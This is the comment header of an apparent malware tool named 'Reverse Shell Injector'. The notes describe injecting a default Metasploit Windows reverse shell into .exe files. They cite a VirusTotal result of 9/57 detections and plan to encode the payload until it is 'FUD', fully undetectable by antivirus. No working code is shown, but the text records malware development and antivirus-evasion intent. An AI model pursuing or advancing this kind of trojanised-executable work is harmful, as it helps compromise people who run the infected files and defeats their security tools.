## Reverse Shell Injector
## Only Supports exe's for now
## non encoded, default msf windows reverse shell gets 9/57
## Either we need to encode the payload before it's injected, encode it as it's appended, or both.
## Result: "https://www.virustotal.com/gui/file/1820c940c43c6c96dcfd09c57aa7068b6f7a8d9975195e75a34d0677f817c2b4/details"
## Note: Most didn't flag it as MSF, only 1 did. This means it's effective at hiding it's true nature, even if not fud yet.
## This of course will be upgraded until FUD. For now, results are perfect shellcode wise, and good exe wise.
